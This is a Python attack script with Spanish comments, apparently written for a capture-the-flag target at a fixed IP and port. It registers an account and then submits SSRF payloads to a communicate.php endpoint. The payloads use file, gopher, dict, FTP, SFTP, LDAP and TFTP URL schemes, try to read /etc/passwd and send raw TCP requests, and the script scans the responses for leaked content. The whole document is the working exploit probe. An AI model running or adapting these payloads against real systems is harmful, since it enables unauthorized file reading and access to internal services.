#!/usr/bin/env python3
"""
Probar diferentes protocolos en el SSRF
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

# Register and login
data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar diferentes esquemas de URL
test_urls = [
    # File protocol
    ("file://motherland.com/etc/passwd", "File protocol"),
    ("file://motherland.com//etc/passwd", "File protocol double slash"),
    
    # Gopher protocol - puede hacer peticiones TCP raw
    ("gopher://motherland.com/_POST%20/%20HTTP/1.1", "Gopher POST"),
    ("gopher://127.0.0.1.motherland.com/", "Gopher con subdomain"),
    
    # Dict protocol
    ("dict://motherland.com/", "Dict protocol"),
    
    # SFTP, FTP
    ("ftp://motherland.com/", "FTP protocol"),
    ("sftp://motherland.com/", "SFTP protocol"),
    
    # LDAP
    ("ldap://motherland.com/", "LDAP protocol"),
    
    # TFTP
    ("tftp://motherland.com/", "TFTP protocol"),
]

for url, description in test_urls:
    print(f"[*] Probando: {description}")
    print(f"    URL: {url}")
    
    data = {
        'url': url,
        'data[test]': 'value'
    }
    
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=10)
        
        if "Wrong URL!" in resp.text:
            print(f"    [-] Rechazado: Wrong URL")
        elif "Failed when parsing URL!" in resp.text:
            print(f"    [-] Rechazado: Failed parsing")
        elif "cURL Error" in resp.text:
            import re
            match = re.search(r'cURL Error: ([^<]+)', resp.text)
            if match:
                error = match.group(1).strip()
                print(f"    [!] cURL Error: {error}")
                
                # Analizar el error
                if "Protocol" in error and "not supported" in error:
                    print(f"        -> Protocolo no soportado por curl")
                elif "timed out" not in error.lower():
                    print(f"        -> ¡Diferente al timeout usual!")
        else:
            # Ver si hay respuesta
            import re
            match = re.search(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
            if match and len(match.group(1)) > 0:
                content = match.group(1)
                print(f"    [+++] ¡HAY RESPUESTA! ({len(content)} chars)")
                print(f"          Primeros 200 chars: {content[:200]}")
                
    except Exception as e:
        print(f"    [!] Exception: {str(e)[:100]}")
    
    print()
